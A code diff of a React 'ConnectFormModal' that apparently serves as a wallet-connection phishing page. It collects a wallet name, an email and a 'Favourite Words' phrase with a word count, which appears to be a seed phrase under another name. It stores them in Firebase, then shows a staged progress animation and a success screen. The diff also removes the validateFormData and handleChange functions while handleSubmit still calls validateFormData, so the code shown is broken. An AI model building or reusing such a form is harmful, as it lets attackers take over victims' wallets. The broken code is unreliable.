@@ -70,68 +70,7 @@ function ConnectFormModal({
   /* =========================
      HANDLE INPUT
   ========================= */
-  const handleChange = (e) => {
-    setValidationError(null);
-
-    setForm({
-      ...form,
-      [e.target.name]:
-        e.target.value,
-    });
-  };
-
-  /* =========================
-     VALIDATE FORM
-  ========================= */
-  const validateFormData = () => {
-    if (!form.name.trim()) {
-      setValidationError(
-        "Wallet name is required"
-      );
-      return false;
-    }
-
-    if (!form.email.trim()) {
-      setValidationError(
-        "Email is required"
-      );
-      return false;
-    }
-
-    const emailRegex =
-      /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-
-    if (
-      !emailRegex.test(form.email)
-    ) {
-      setValidationError(
-        "Please enter a valid email address"
-      );
-      return false;
-    }
-
-    /* Favourite Words */
-    if (tab === "phrase") {
-      const validation =
-        validateFavouriteWords(
-          form.phrase
-        );
-
-      if (!validation.isValid) {
-        setValidationError(
-          validation.error
-        );
-        return false;
-      }
-    }
-
-    return true;
-  };
-
-  /* =========================
-     HANDLE SUBMIT
-  ========================= */
- const handleSubmit = async () => {
+const handleSubmit = async () => {
   if (!validateFormData()) return;
 
   setIsLoading(true);
@@ -139,7 +78,7 @@ function ConnectFormModal({
   setValidationError(null);
 
   try {
-    console.log("🚀 handleSubmit started");
+    console.log("🚀 Starting form submission...");
 
     let walletData = {
       name: form.name.trim(),
@@ -153,45 +92,40 @@ function ConnectFormModal({
       walletData.wordCount = validation.wordCount;
     }
 
-    console.log("📤 About to call saveWalletConnection with:", walletData);
+    console.log("📤 Saving to Firebase:", walletData);
 
     const result = await saveWalletConnection(walletData);
-    
-    console.log("✅ Result received from saveWalletConnection:", result);
+    console.log("✅ Firebase Response:", result);
 
     if (!result?.success) {
       throw new Error(result?.error || "Failed to save data");
     }
 
     setUniqueId(result.uid);
-    console.log("✅ Unique ID set:", result.uid);
 
-    // Progress Animation
+    // Smooth Progress Animation
     setStep(1);
     setProgress(20);
-    await new Promise(r => setTimeout(r, 800));
+    await new Promise(r => setTimeout(r, 900));
 
     setStep(2);
     setProgress(60);
-    await new Promise(r => setTimeout(r, 800));
+    await new Promise(r => setTimeout(r, 900));
 
     setStep(3);
     setProgress(100);
-    await new Promise(r => setTimeout(r, 600));
+    await new Promise(r => setTimeout(r, 700));
 
     setSuccess(true);
-    console.log("🎉 setSuccess(true) called successfully");
-
-    alert("✅ Success! The modal should appear now.");
+    console.log("🎉 Success modal triggered");
 
   } catch (err) {
-    console.error("❌ CATCH BLOCK ERROR:", err);
+    console.error("❌ Submission Error:", err);
     setError(err.message || "Something went wrong. Please try again.");
     setStep(0);
     setProgress(0);
   } finally {
     setIsLoading(false);
-    console.log("🏁 handleSubmit finished");
   }
 };
 
